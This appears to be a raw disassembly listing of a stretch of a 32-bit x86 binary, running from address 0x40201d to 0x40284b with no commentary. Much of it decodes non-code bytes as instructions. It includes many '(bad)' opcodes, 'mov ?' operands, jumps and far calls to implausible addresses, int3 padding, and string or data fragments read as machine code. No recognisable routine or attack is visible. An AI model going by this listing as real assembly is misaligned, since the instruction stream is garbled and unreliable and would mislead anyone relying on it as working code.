  40201d:	arpl   WORD PTR [ecx+0x74],sp
  402020:	inc    ecx
  402021:	or     ch,BYTE PTR [ecx+0x76]
  402024:	push   edx
  402025:	cs js  0x402048
  402028:	ins    DWORD PTR es:[edi],dx
  402029:	jo     0x40209e
  40202b:	jo     0x40209c
  40202d:	jns    0x40209e
  40202f:	jae    0x40209f
  402031:	cmp    dh,BYTE PTR [esi+0x73]
  402034:	arpl   WORD PTR [edx+0x6e],si
  402037:	bound  ecx,QWORD PTR [edx]
  402039:	push   ebx
  40203a:	imul   ecx,DWORD PTR [edi+0xb],0x3d
  40203e:	add    BYTE PTR [eax],al
  402040:	or     eax,0xde162e72
  402045:	pop    ecx
  402046:	sub    bh,BYTE PTR [ebx-0x88c0d55]
  40204c:	out    dx,eax
  40204d:	imul   edi,DWORD PTR [ebx+eiz*2-0x441666d1],0x4045bdc2
  402058:	into   
  402059:	and    ecx,esi
  40205b:	adc    eax,0x8a000071
  402060:	fs pop ebp
  402062:	add    BYTE PTR [eax],al
  402064:	sti    
  402065:	jo     0x402033
  402067:	add    BYTE PTR [edx+eiz*2-0x5c],dh
  40206b:	jmp    0x4020d6
  40206d:	mov    ?,edi
  40206f:	sahf   
  402070:	cmp    DWORD PTR gs:[ecx-0x1],esi
  402074:	sbb    al,0x42
  402076:	clc    
  402077:	push   es
  402078:	pop    edi
  402079:	inc    eax
  40207a:	into   
  40207b:	sbb    cl,0x2a
  40207e:	rcl    BYTE PTR [edx+0x747474fa],1
  402084:	add    eax,0xf6747433
  402089:	pusha  
  40208a:	je     0x402100
  40208c:	je     0x402019
  40208e:	mov    ecx,DWORD PTR [ebx-0x74747475]
  402094:	mov    ecx,DWORD PTR [ebx+0x1faa8abb]
  40209a:	jle    0x402070
  40209c:	sbb    al,cl
  40209e:	fldcw  WORD PTR [edx-0x2c]
  4020a1:	jns    0x402083
  4020a3:	and    BYTE PTR [edx-0x51],dl
  4020a6:	adc    al,0xed
  4020a9:	jle    0x4020cd
  4020ab:	dec    ecx
  4020ac:	xchg   esp,eax
  4020ad:	(bad)  
  4020ae:	(bad)  
  4020af:	(bad)  
  4020b0:	(bad)  
  4020b1:	(bad)  
  4020b2:	(bad)  
  4020b3:	(bad)  
  4020b4:	(bad)  
  4020b5:	(bad)  
  4020b6:	(bad)  
  4020b7:	call   0x473e47a4
  4020bc:	into   
  4020bd:	call   0x84c55daa
  4020c2:	lea    eax,[edx+0x20]
  4020c5:	and    ah,BYTE PTR [ecx]
  4020c7:	xchg   edi,eax
  4020c8:	in     eax,dx
  4020c9:	int3   
  4020ca:	and    BYTE PTR [ecx-0x41501a69],dh
  4020d0:	leave  
  4020d1:	cmp    BYTE PTR [ebp-0x52c4d7d3],bl
  4020d7:	(bad)
  4020dc:	retf   0xbd17
  4020df:	imul   ecx,DWORD PTR [ebx-0x2171744],0xc4e8e860
  4020e9:	ret    
  4020ea:	xchg   eax,ebp
  4020ec:	and    al,0x17
  4020ee:	call   DWORD PTR [ecx]
  4020f0:	xchg   ecx,eax
  4020f1:	pop    ecx
  4020f2:	cli    
  4020f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020f4:	clc    
  4020f5:	sub    DWORD PTR [ecx],eax
  4020f7:	mov    bl,0x4d
  4020f9:	lods   eax,DWORD PTR ds:[esi]
  4020fa:	or     BYTE PTR ss:[ecx],dh
  4020fd:	jmp    eax
  4020ff:	push   es
  402100:	call   0x2424:0xb17f6f5c
  402107:	and    al,0x75
  402109:	(bad)  
  40210a:	test   al,0x5
  40210c:	adc    esp,DWORD PTR [esi+0x29]
  40210f:	push   eax
  402110:	sub    eax,0x70148c31
  402115:	pop    ss
  402116:	sbb    DWORD PTR [ebp+0x4c],eax
  402119:	inc    esp
  40211a:	jmp    0x58961393
  40211f:	add    ch,cl
  402121:	ss out 0x32,eax
  402124:	add    al,0x24
  402126:	and    al,0x2d
  402128:	add    DWORD PTR [ebx+0x24],ecx
  40212b:	and    al,0x24
	...
  402135:	add    BYTE PTR [ecx+0x5a],dh
  402138:	xchg   esi,eax
	...
  402141:	add    BYTE PTR [eax],cl
  402143:	or     BYTE PTR ds:0x7cda24fe,ch
  402149:	rcl    ecx,1
  40214b:	loope  0x4021a3
  40214d:	test   al,0xec
  40214f:	jne    0x40214a
  402151:	inc    ebx
  402152:	shl    DWORD PTR [ebp-0x1784dcb0],0xef
  402159:	jmp    0x529a:0x808976c
  402160:	or     BYTE PTR [eax],cl
  402162:	mov    ch,BYTE PTR [ebx+0x8]
  402165:	or     BYTE PTR [eax+0x4f],ch
  402168:	add    esp,ecx
  40216a:	jns    0x40211a
  40216c:	(bad)  
  40216d:	cmp    esp,DWORD PTR [ecx]
  40216f:	add    al,BYTE PTR [eax-0x4a42cffc]
  402175:	scas   al,BYTE PTR es:[edi]
  402176:	jns    0x4021e4
  402178:	aas    
  402179:	or     al,0x34
  40217b:	jmp    0x487114
  402180:	mov    edx,0xc0c969
  402185:	add    BYTE PTR [eax],al
  402187:	fimul  WORD PTR [ebp-0x54]
  40218a:	sahf   
  40218b:	and    al,BYTE PTR [ebp+0x546c824f]
  402191:	or     al,0x95
  402193:	push   eax
  402194:	fcomp  QWORD PTR [edi-0x30]
  402197:	pop    edx
  402198:	jg     0x40213e
  40219a:	cmp    ch,BYTE PTR [ecx]
  40219c:	call   0xa4a0:0xb9b92d9
  4021a3:	jno    0x4021b6
  4021a5:	loope  0x402204
  4021a7:	and    BYTE PTR [edi+0x6f],0x0
  4021ab:	add    BYTE PTR [edi],bh
  4021ad:	enter  0x0,0x0
	...
  4021b9:	add    BYTE PTR [ebx+0x3ff3],bl
  4021bf:	add    BYTE PTR [eax],al
  4021c1:	add    BYTE PTR [eax],al
  4021c3:	add    BYTE PTR [eax],al
  4021c5:	add    BYTE PTR [ebx-0xac8a975],cl
  4021cb:	test   eax,0x408c13b1
  4021d0:	mov    ds:0xb5741421,eax
  4021d5:	shl    DWORD PTR [esi+0x6d18e6ad],0xe4
  4021dc:	sbb    al,0x4c
  4021de:	jge    0x402229
  4021e0:	mov    ecx,DWORD PTR [ebx-0xb8f7583]
  4021e6:	fist   DWORD PTR [ebx+0x1a790126]
  4021ec:	int    0x6a
  4021ee:	xcrypt-ofb (bad)
  4021ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021f0:	ins    DWORD PTR es:[edi],dx
  4021f1:	clc    
  4021f2:	outs   dx,DWORD PTR ds:[esi]
  4021f3:	dec    edx
  4021f4:	jbe    0x402199
  4021f6:	mov    eax,ds:0xf39e8885
  4021fb:	jo     0x402188
  4021fd:	mov    bl,0x51
  4021ff:	mov    ecx,DWORD PTR [ebx-0x74270dac]
  402205:	mov    ecx,esp
  402207:	xor    edi,DWORD PTR [esi-0x75]
  40220a:	add    cl,dh
  40220c:	jge    0x4021dd
  40220e:	jae    0x4021d2
  402210:	in     eax,0xb1
  402212:	retf   0x150d
  402215:	arpl   WORD PTR [eax],bx
  402217:	xchg   esi,eax
  402218:	push   eax
  402219:	jns    0x402289
  40221b:	test   eax,0xc715f166
  402220:	(bad)  
  402221:	loope  0x4021ed
  402223:	add    BYTE PTR [eax],al
  402225:	add    BYTE PTR [ebp-0x1b],bh
  402228:	add    BYTE PTR [eax],al
  40222a:	mov    edx,DWORD PTR [ebx+0x0]
	...
  402238:	retf   0x6c7e
  40223b:	push   cs
  40223c:	jnp    0x4022a8
  40223e:	scas   eax,DWORD PTR es:[edi]
  40223f:	fnstenv [edx+0x4c]
  402242:	scas   eax,DWORD PTR es:[edi]
  402243:	loopne 0x4022b0
  402245:	aam    0x33
  402247:	enter  0xe62,0x9b
  40224b:	in     al,dx
  40224c:	inc    ebp
  40224d:	sub    eax,0xcccc4a9d
  402252:	int3   
  402253:	int3   
  402254:	int3   
  402255:	int3   
  402256:	int3   
  402257:	int3   
  402258:	int3   
  402259:	add    BYTE PTR [eax],al
  40225b:	or     BYTE PTR [ecx+0x7a3a],0xb
  402262:	(bad)  
  402263:	aam    0x5b
  402265:	xchg   esi,eax
  402266:	scas   eax,DWORD PTR es:[edi]
  402267:	sbb    eax,0x3f1a3a38
  40226c:	xchg   BYTE PTR [ebx-0x6f04d9ec],ah
  402272:	repnz fist WORD PTR [esi]
  402275:	mov    BYTE PTR [edx+0x15b1eb86],bh
  40227b:	sub    DWORD PTR [ecx-0x5d],ebx
  40227e:	imul   esi,DWORD PTR [edi+0x49886e1a],0x0
  402285:	add    BYTE PTR [ecx+0x3c000054],al
  40228b:	aad    0xe3
  40228d:	add    BYTE PTR [eax],al
  40228f:	stos   DWORD PTR es:[edi],eax
  402290:	in     al,0xd4
  402292:	or     DWORD PTR [edi+0x57fdf68d],esi
  402298:	aad    0x1
  40229a:	xor    cl,bh
  40229c:	dec    ebx
  40229d:	scas   eax,DWORD PTR es:[edi]
  40229e:	pop    ebx
  40229f:	jo     0x40230a
  4022a1:	gs gs popa 
  4022a4:	arpl   WORD PTR [ebx+0x28],si
  4022a7:	gs jb  0x40230d
  4022aa:	das    
  4022ab:	push   ebx
  4022ac:	cmp    al,0x53
  4022ae:	dec    ebp
  4022af:	popa   
  4022b0:	sub    DWORD PTR [edx+0x3c],esi
  4022b3:	imul   esp,DWORD PTR [ebp+0x20],0x62706565
  4022ba:	inc    esp
  4022bb:	outs   dx,DWORD PTR ds:[esi]
  4022bc:	ins    DWORD PTR es:[edi],dx
  4022bd:	jae    0x4022df
  4022bf:	outs   dx,DWORD PTR gs:[esi]
  4022c1:	imul   eax,DWORD PTR [ebx+0x63],0x61224165
  4022c8:	inc    esp
  4022c9:	outs   dx,DWORD PTR ds:[esi]
  4022ca:	je     0x402331
  4022cc:	or     ch,BYTE PTR [edi+0x73]
  4022cf:	and    BYTE PTR [esi+0x69],ch
  4022d2:	ins    DWORD PTR es:[edi],dx
  4022d3:	push   edi
  4022d4:	gs jb  0x4022f9
  4022d7:	sub    DWORD PTR [ecx+0x20],ebp
  4022da:	and    BYTE PTR [esi+0x22],ch
  4022dd:	ins    DWORD PTR es:[edi],dx
  4022de:	jo     0x402353
  4022e0:	push   edi
  4022e1:	ds gs ins DWORD PTR es:[edi],dx
  4022e4:	push   ebx
  4022e5:	popa   
  4022e6:	jb     0x402361
  4022e8:	gs ins DWORD PTR es:[edi],dx
  4022ea:	gs je  0x402344
  4022ed:	jb     0x402354
  4022ef:	push   ebx
  4022f0:	outs   dx,BYTE PTR ds:[esi]
  4022f1:	ins    DWORD PTR es:[edi],dx
  4022f2:	outs   dx,DWORD PTR ds:[esi]
  4022f3:	or     eax,0x226f6561
  4022f8:	gs fs jb 0x40236e
  4022fc:	push   eax
  4022fd:	addr16 push edx
  4022ff:	ins    DWORD PTR es:[edi],dx
  402300:	cs addr16 inc esp
  402303:	gs cmp ah,BYTE PTR gs:[ebp+0x3c]
  402308:	cmp    al,0x70
  40230a:	cs addr16 das 
  40230d:	neg    DWORD PTR [edi+0x1]
  402310:	int3   
  402311:	or     ch,BYTE PTR [ebx]
  402313:	outs   dx,BYTE PTR ds:[esi]
  402314:	loopne 0x402316
  402316:	add    BYTE PTR [eax],al
  402318:	lea    ecx,[edi+0x39c01656]
  40231e:	outs   dx,BYTE PTR ds:[esi]
  40231f:	sbb    DWORD PTR [edi-0x1f22d01c],esp
  402325:	shl    esi,cl
  402327:	lea    edi,[ebp-0x32]
  40232a:	push   ss
  40232b:	jbe    0x402310
  40232d:	int3   
  40232e:	ficom  WORD PTR [ebx]
  402330:	sti    
  402331:	mov    dh,0xbc
  402333:	addr16 jnp 0x402336
  402336:	add    BYTE PTR [ecx],ah
  402338:	(bad)  
  402339:	scas   al,BYTE PTR es:[edi]
  40233a:	add    BYTE PTR [eax],al
  40233c:	add    BYTE PTR [ebx-0x74747475],cl
  402342:	mov    ecx,DWORD PTR [ebx-0x15527475]
  402348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402349:	call   0xe9290c36
  40234e:	call   0x84290c3b
  402353:	sub    DWORD PTR [eax-0x5bdbe605],0xffffffea
  40235a:	loop   0x402368
  40235c:	inc    esi
  40235d:	inc    ecx
  40235e:	mov    esp,0xf0a4b8e8
  402363:	jmp    0x40230e
  402365:	scas   al,BYTE PTR es:[edi]
  402366:	push   es
  402367:	inc    ebx
  402368:	shl    ah,0x32
  40236b:	mov    esp,0x11a8383
  402370:	add    DWORD PTR [ebx-0x7c7cb34d],0x2f
  402377:	(bad)  
  402378:	or     al,0x19
  40237a:	mov    BYTE PTR [eax+0x2b77f0cd],0x21
  402381:	jne    0x4023f2
  402383:	retf   0xb5e2
  402386:	int    0x4d
  402388:	nop
  402389:	leave  
  40238a:	ds aad 0x8c
  40238d:	hlt    
  40238e:	add    DWORD PTR [eax],0xffffffb1
  402391:	pushf  
  402392:	mov    eax,0xc8
  402397:	jae    0x402415
  402399:	fcmovnb st,st(0)
  40239b:	in     al,0xe1
  40239d:	push   ss
  40239e:	popf   
  40239f:	sbb    DWORD PTR [ebp-0x65],0x8233f762
  4023a6:	inc    eax
  4023a7:	dec    esp
  4023a8:	cli    
  4023a9:	add    DWORD PTR [ebx+eax*4],0xfffffff4
  4023ad:	mov    al,ds:0x75e1fea8
  4023b2:	sbb    eax,0x45f2fb61
  4023b7:	ffree  st(3)
  4023b9:	mov    dl,0x0
  4023bb:	add    BYTE PTR ds:0xd7,ah
  4023c1:	rol    al,0xc0
  4023c4:	rol    al,0xc0
  4023c7:	rol    al,0xc0
  4023ca:	pop    esp
  4023cb:	lods   al,BYTE PTR ds:[esi]
  4023cc:	ret    0x0
  4023cf:	add    BYTE PTR [eax],al
  4023d1:	add    BYTE PTR [eax],al
  4023d3:	add    BYTE PTR [eax],al
  4023d5:	add    BYTE PTR [ebp+0xd21198d],cl
  4023db:	in     al,dx
  4023dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023dd:	call   DWORD PTR [ecx]
  4023df:	lods   eax,DWORD PTR ds:[esi]
  4023e0:	std    
  4023e1:	hlt    
  4023e2:	and    al,0x24
  4023e4:	mov    dh,0xee
  4023e6:	in     eax,0x1e
  4023e8:	retf   0xb000
  4023eb:	mov    eax,ds:0x3945407
  4023f0:	lea    ecx,[ebp-0x74f11920]
  4023f6:	push   ds
  4023f7:	sbb    al,0x6f
  4023f9:	sub    eax,0x886235c4
  4023fe:	bound  edi,QWORD PTR [ebx]
  402400:	dec    eax
  402401:	out    0xa9,eax
  402403:	cmp    eax,0x52a949d8
  402408:	pop    esi
  402409:	add    al,0x2
  40240b:	cwde   
  40240c:	adc    eax,0x8d8d4c20
  402411:	ror    BYTE PTR [ebx-0x74],cl
  402414:	lea    ecx,[ebp-0x7248458c]
  40241a:	add    bl,ch
  40241c:	mov    edx,0xdf516227
  402421:	push   edx
  402422:	loopne 0x402458
  402424:	imul   edx,eax,0x882ca03f
  40242a:	sbb    BYTE PTR [ecx],0x9e
  40242d:	inc    ebx
  40242e:	mov    DWORD PTR [eax],edi
  402430:	mov    ds:0x3a7a,eax
  402435:	add    BYTE PTR [eax-0x53ffff78],bl
  40243b:	inc    ecx
	...
  402448:	sbb    DWORD PTR [esp+ebp*8-0x16],eax
  40244c:	cwde   
  40244d:	xor    eax,DWORD PTR [ecx+0x3e]
  402450:	mov    eax,ds:0xd6bf1580
  402455:	fs cld 
  402457:	mov    WORD PTR [ebx],fs
  402459:	popa   
  40245a:	xor    bl,dh
  40245c:	cmp    esi,eax
  40245e:	add    al,0x20
	...
  402468:	add    BYTE PTR [eax+0x50],dl
  40246b:	xlat   BYTE PTR fs:[ebx]
  40246d:	hlt    
  40246e:	dec    esi
  40246f:	push   eax
  402470:	push   eax
  402471:	sub    cl,BYTE PTR [ecx+eiz*2-0x256fd632]
  402478:	push   esi
  402479:	mov    eax,ds:0x71c6d31e
  40247e:	pop    es
  40247f:	cmp    DWORD PTR [ebx+edi*1+0x69],0xffffff90
  402484:	push   esp
  402485:	test   eax,0x863630d9
  40248a:	ret    
  40248b:	(bad)  
  40248d:	xor    DWORD PTR [ecx+ebx*8+0x5a],esi
  402491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402492:	test   al,0x22
  402494:	push   eax
  402495:	push   eax
  402496:	add    eax,0xc550500a
  40249b:	jo     0x4024ea
  40249d:	push   eax
  40249e:	add    BYTE PTR [esi-0x38],ch
  4024a1:	lds    esi,FWORD PTR [edi]
  4024a3:	ret    
  4024a4:	outs   dx,DWORD PTR ds:[esi]
  4024a5:	add    al,0xa5
  4024a7:	or     BYTE PTR [esi-0x3d9cf389],al
  4024ad:	xor    BYTE PTR [ecx+edi*4-0x69],dh
  4024b1:	inc    edx
  4024b2:	dec    ebx
  4024b3:	sbb    bl,BYTE PTR [edi]
  4024b5:	mov    ds:0x7b,al
  4024ba:	lds    edi,FWORD PTR [edx-0x7f9bd51e]
  4024c0:	repnz fadd DWORD PTR ds:0xf7d30c39
  4024c7:	jmp    0xe00a:0x9f6e803e
  4024ce:	(bad)  
  4024cf:	es stos DWORD PTR es:[edi],eax
  4024d1:	and    DWORD PTR ds:0xa5dd7ab1,eax
  4024d7:	add    BYTE PTR [eax],al
  4024d9:	sbb    eax,0x1f6
  4024de:	add    ah,cl
  4024e0:	int3   
  4024e1:	int3   
  4024e2:	int3   
  4024e3:	int3   
  4024e4:	int3   
  4024e5:	int3   
  4024e6:	int3   
  4024e7:	int3   
  4024e8:	dec    esi
  4024e9:	fwait
  4024ea:	dec    esp
	...
  4024f3:	add    BYTE PTR [edx+0x6a],ch
  4024f6:	fs inc esp
  4024f8:	mov    bh,0xed
  4024fa:	ror    DWORD PTR [ecx],1
  4024fc:	js     0x40256e
  4024fe:	pop    ecx
  4024ff:	adc    DWORD PTR [esi-0x60],esp
  402502:	mov    fs,WORD PTR [ecx-0xb775745]
  402508:	loopne 0x402563
  40250a:	cdq    
  40250b:	inc    ebp
  40250c:	mov    fs,WORD PTR [ebp+0x166a6a6a]
  402512:	push   0x6a
  402514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402515:	js     0x402581
  402517:	push   0x27
  402519:	mov    ch,0xbf
  40251b:	pop    edx
  40251c:	or     eax,0x9f5b7b34
  402521:	jmp    0x99bf9299
  402526:	test   BYTE PTR gs:[edi+0x69],bh
  40252a:	push   ds
  40252b:	jecxz  0x40258a
  40252d:	lahf   
  40252e:	jno    0x4024d3
  402530:	push   0x0
  402532:	cs push ecx
  402534:	in     eax,dx
  402535:	ja     0x402537
  402537:	add    BYTE PTR [eax],al
  402539:	and    eax,0x888c18d
  40253e:	and    ebp,DWORD PTR [eax+0x28]
  402541:	repz test al,0xe1
  402544:	addps  xmm4,XMMWORD PTR [edi-0x8]
  402548:	push   edx
  402549:	dec    edi
  40254a:	xor    BYTE PTR [edi+0x35],bl
  40254d:	leave  
  40254e:	aas    
  40254f:	pushf  
  402550:	mov    ds:0x6fd99f1a,al
  402555:	add    al,0x34
  402557:	ret    0xe451
  40255a:	mov    ebp,0xd3000001
  40255f:	mov    ds:0x8b000000,eax
  402564:	mov    ecx,DWORD PTR [ebx-0x74747475]
  40256a:	mov    ecx,DWORD PTR [ebx+0x1a3a8b]
	...
  402578:	lea    ecx,[ebp-0x590ea792]
  40257e:	iret   
  40257f:	mov    al,ds:0x51411dcf
  402584:	add    ah,dh
  402586:	daa    
  402587:	outs   dx,DWORD PTR ds:[esi]
  402588:	adc    cl,BYTE PTR [ebx]
  40258a:	pop    esp
  40258b:	sbb    eax,0xdf36c058
  402590:	into   
  402591:	iret   
  402592:	lea    ecx,[ebp-0x6ec83058]
  402598:	test   al,0x8b
  40259a:	shl    DWORD PTR [edi],0x55
  40259d:	dec    ebx
  40259e:	xor    eax,0xe3f54278
  4025a3:	adc    ecx,esp
  4025a5:	ss pop esi
  4025a7:	(bad)  
  4025a8:	mov    bl,0xd9
  4025aa:	mov    eax,0x9d86c86
  4025af:	xor    BYTE PTR [edx],ch
  4025b1:	lea    ecx,[ebp-0x720363b2]
  4025b7:	lea    ebx,[ebx+ebp*2-0x15]
  4025bb:	lea    eax,[eax]
  4025bd:	pop    ecx
  4025be:	or     ah,BYTE PTR [ecx+0x5849619f]
  4025c4:	inc    ebp
  4025c5:	pop    edx
  4025c6:	sbb    edx,DWORD PTR [esi-0x17]
  4025c9:	and    al,0x56
  4025cb:	cmp    esi,ebx
  4025cd:	imul   esi,DWORD PTR [esi+0xbb3109f],0xfd9a
  4025d7:	add    cl,ch
  4025d9:	xlat   BYTE PTR ds:[ebx]
  4025da:	add    BYTE PTR [eax],al
  4025dc:	das    
  4025dd:	outs   dx,DWORD PTR ds:[esi]
  4025de:	add    BYTE PTR [eax],al
  4025e0:	add    BYTE PTR [ebp+0x45],al
  4025e3:	inc    ebp
  4025e4:	inc    ebp
  4025e5:	inc    ebp
  4025e6:	inc    ebp
  4025e7:	inc    ebp
  4025e8:	inc    ebp
  4025e9:	inc    ebp
  4025ea:	retf   
  4025eb:	mov    eax,0xbdbb1be5
  4025f0:	(bad)  
  4025f1:	(bad)  
  4025f2:	jg     0x402668
  4025f4:	mov    eax,0x80ec29d5
  4025f9:	pop    edi
  4025fa:	into   
  4025fb:	jno    0x4025dd
  4025fd:	std    
  4025fe:	dec    edx
  4025ff:	xchg   ebx,eax
  402600:	sub    BYTE PTR ds:0xffffffff,ch
  402606:	(bad)  
  402607:	(bad)  
  402608:	(bad)  
  402609:	(bad)  
  40260a:	inc    DWORD PTR [ebp+0x45]
  40260d:	xlat   BYTE PTR ds:[ebx]
  40260e:	cmc    
  40260f:	js     0x402648
  402611:	inc    ebp
  402612:	inc    ebp
  402613:	outs   dx,BYTE PTR ds:[esi]
  402614:	mov    edx,0xbfc04dac
  402619:	mov    bh,BYTE PTR [edi+0x2d]
  40261c:	mov    es,WORD PTR [esi]
  40261e:	aas    
  40261f:	call   0xaa50:0xf14a886c
  402626:	sbb    ah,bl
  402628:	repnz push 0xffffffd8
  40262b:	push   0x51
  40262d:	dec    esi
  40262e:	pop    eax
  40262f:	dec    eax
  402630:	fwait
  402631:	das    
  402632:	add    al,0xb0
  402634:	dec    DWORD PTR [edi]
  402636:	inc    ebp
  402637:	inc    ebp
  402638:	adc    edx,0x65
  40263b:	je     0x40265d
  40263d:	popa   
  40263e:	jb     0x402660
  402640:	and    BYTE PTR gs:[eax],ah
  402643:	arpl   WORD PTR [edx+0x63],si
  402646:	je     0x4026be
  402648:	outs   dx,BYTE PTR ds:[esi]
  402649:	outs   dx,BYTE PTR ds:[esi]
  40264a:	je     0x4026b5
  40264c:	gs ds jae 0x402670
  402650:	outs   dx,DWORD PTR ds:[esi]
  402651:	bound  ebp,QWORD PTR gs:[esi]
  402654:	cs gs outs dx,BYTE PTR ds:[esi]
  402658:	jb     0x4026bc
  40265a:	jb     0x4026b3
  40265c:	jb     0x4026ce
  40265e:	jae    0x4026d2
  402660:	ins    DWORD PTR es:[edi],dx
  402661:	das    
  402662:	cs ins DWORD PTR es:[edi],dx
  402664:	outs   dx,DWORD PTR cs:[esi]
  402666:	or     eax,0x3a20726e
  40266b:	cmp    eax,0x202e6e20
  402670:	and    dh,BYTE PTR cs:[edx+0x65]
  402674:	inc    ebp
  402675:	inc    ebp
  402676:	or     DWORD PTR gs:[ebx+0x45],esp
  40267a:	add    cl,dh
  40267c:	or     DWORD PTR [esi+0x198b9ba5],0xfae475a8
  402686:	not    ah
  402688:	or     cl,bl
  40268a:	mov    ?,WORD PTR [edi-0x5ecf494d]
  402690:	ret    
  402691:	stos   BYTE PTR es:[edi],al
  402692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402693:	add    BYTE PTR [eax],al
  402695:	add    BYTE PTR [esp+ebp*1-0x59],ah
  402699:	sbb    ah,ah
  40269b:	mov    al,0x28
  40269d:	retf   0xb25b
  4026a0:	(bad)  [edi+0x2f]
  4026a3:	les    eax,FWORD PTR [edx]
  4026a5:	mov    ebx,0x6baae691
  4026aa:	mov    BYTE PTR cs:[ebx+0x91cc2fc],bl
  4026b1:	jno    0x4026a0
  4026b3:	add    BYTE PTR [eax],al
  4026b5:	div    BYTE PTR [ecx]
  4026b7:	out    0x0,eax
	...
  4026c1:	add    BYTE PTR [eax],al
  4026c3:	add    BYTE PTR [esi+0x1dcd],cl
	...
  4026d1:	add    BYTE PTR [esi+0x6c],dh
  4026d4:	lods   eax,DWORD PTR ds:[esi]
  4026d5:	xchg   ebx,eax
  4026d6:	call   0x51f813f1
  4026db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026dc:	jecxz  0x402682
  4026de:	in     al,0xe2
  4026e0:	inc    eax
  4026e1:	xchg   DWORD PTR [eax+eax*4+0x569d8785],edi
  4026e8:	in     eax,0xf0
  4026ea:	add    BYTE PTR [eax],al
  4026ec:	push   ebx
  4026ed:	sldt   WORD PTR [eax]
  4026f0:	lds    edi,FWORD PTR [edi-0x1eda0000]
  4026f6:	aaa    
  4026f7:	cmp    BYTE PTR [ebx+0x16b99d66],dh
  4026fd:	out    0xf9,al
  4026ff:	push   ecx
  402700:	pop    edi
  402701:	test   eax,0x6727cfc4
  402706:	add    eax,0x92e3edc1
  40270b:	stos   DWORD PTR es:[edi],eax
  40270c:	add    BYTE PTR [eax],al
  40270e:	fldcw  WORD PTR [eax-0x73]
  402711:	hlt    
  402712:	add    BYTE PTR [eax],al
  402714:	add    BYTE PTR [eax-0x5aa08edb],ah
  40271a:	mov    WORD PTR [edx-0xac2564e],es
  402720:	(bad)  
  402721:	popa   
  402722:	sbb    dh,BYTE PTR [edx-0x7f2c07f6]
  402728:	xchg   ecx,eax
  402729:	dec    edx
  40272a:	mov    ecx,0xdee7dfa1
  40272f:	das    
  402730:	mov    edx,0xc762f829
  402735:	push   es
  402736:	cmp    al,0x22
  402738:	add    BYTE PTR [eax],al
  40273a:	or     al,0xb4
  40273c:	add    BYTE PTR [eax],al
  40273e:	add    bh,bh
  402740:	(bad)  
  402741:	(bad)  
  402742:	(bad)  
  402743:	(bad)  
  402744:	(bad)  
  402745:	(bad)  
  402746:	(bad)  
  402747:	push   DWORD PTR [ecx+0xb9f0]
  40274d:	add    BYTE PTR [eax],al
  40274f:	add    BYTE PTR [eax],al
  402751:	add    BYTE PTR [eax],al
  402753:	add    BYTE PTR [ebp+0x50978685],al
  402759:	and    bl,0xf9
  40275c:	sbb    ch,BYTE PTR [ecx+0x17]
  40275f:	out    0x13,eax
  402761:	fimul  DWORD PTR [esp+eiz*2+0x56]
  402765:	sub    esi,DWORD PTR [esi-0x5bfb1f32]
  40276b:	hlt    
  40276c:	loope  0x40271b
  40276e:	test   DWORD PTR [ebp+0x68e3d215],eax
  402774:	or     al,0xc0
  402776:	inc    eax
  402777:	es inc ecx
  402779:	pusha  
  40277a:	out    dx,eax
  40277b:	data16 and dh,BYTE PTR [ebp-0xc]
  40277f:	hlt    
  402780:	add    eax,0x60f12d12
  402785:	sar    BYTE PTR [ebx+0x3f944546],cl
  40278b:	rol    BYTE PTR [ebp+eax*4-0x7b],1
  40278f:	fiadd  WORD PTR [ecx]
  402791:	fadd   DWORD PTR [ebp-0x7c193c7b]
  402797:	test   DWORD PTR [ecx+ebp*4],eax
  40279a:	jl     0x402773
  40279c:	cdq    
  40279d:	repnz cmovle ebp,DWORD PTR [ebx-0x680f2487]
  4027a5:	shl    bl,0x74
  4027a8:	(bad)  
  4027aa:	js     0x4027a1
  4027ac:	jns    0x4027a0
  4027ae:	(bad)  
  4027af:	in     al,0xa2
  4027b1:	add    al,0x4
  4027b3:	add    al,0xa1
  4027b5:	cmp    al,BYTE PTR [esp+eax*1]
  4027b8:	or     eax,0x4040425
  4027bd:	mov    DWORD PTR [ecx-0x76767677],ecx
  4027c3:	mov    DWORD PTR [ecx-0x1c355777],ecx
  4027c9:	sub    BYTE PTR [eax],dl
  4027cb:	add    DWORD PTR [esi],edx
  4027cd:	pop    ds
  4027ce:	pop    edx
  4027cf:	push   eax
  4027d0:	jmp    0x71490da5
  4027d5:	mov    al,0xbb
  4027d7:	retf   
  4027d8:	mov    esi,0x22cdb70
  4027dd:	stos   DWORD PTR es:[edi],eax
  4027de:	call   0xe92910cb
  4027e3:	call   0x2910d0
  4027e8:	call   DWORD PTR [edi-0x874145]
  4027ee:	push   DWORD PTR [esi+0x16]
  4027f1:	scas   eax,DWORD PTR es:[edi]
  4027f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027f3:	cmc    
  4027f4:	int    0x9e
  4027f6:	add    al,0xd6
  4027f8:	hlt    
  4027f9:	inc    esi
  4027fa:	imul   ecx,DWORD PTR [eax-0x7],0xcd954464
  402801:	pop    ebp
  402802:	loopne 0x4027f2
  402804:	pusha  
  402805:	imul   DWORD PTR [esi-0xe]
  402808:	push   esp
  402809:	in     al,0xb2
  40280b:	adc    cl,bl
  40280d:	cdq    
  40280e:	xor    BYTE PTR ds:0xffff1750,dh
  402814:	pop    esi
  402815:	repz das 
  402817:	js     0x402886
  402819:	gs jo  0x402889
  40281c:	and    BYTE PTR [edx],bh
  40281e:	outs   dx,DWORD PTR ds:[esi]
  40281f:	inc    esp
  402820:	imul   ebp,DWORD PTR [edi+0x69],0x650a650d
  402827:	popa   
  402828:	gs push 0x73736276
  40282e:	gs je  0x402896
  402831:	and    BYTE PTR [ebp+0x70],ah
  402834:	and    BYTE PTR [eax+0x70],dl
  402837:	or     cl,BYTE PTR [edx]
  402839:	outs   dx,BYTE PTR ds:[esi]
  40283a:	addr16 jae 0x4028ac
  40283d:	ds inc ebx
  40283f:	ds and ah,BYTE PTR gs:[ebp+0x65]
  402844:	and    BYTE PTR [ebp+0x41],ah
  402847:	outs   dx,BYTE PTR ds:[esi]
  402848:	inc    edx
  402849:	gs jne 0x4028b1
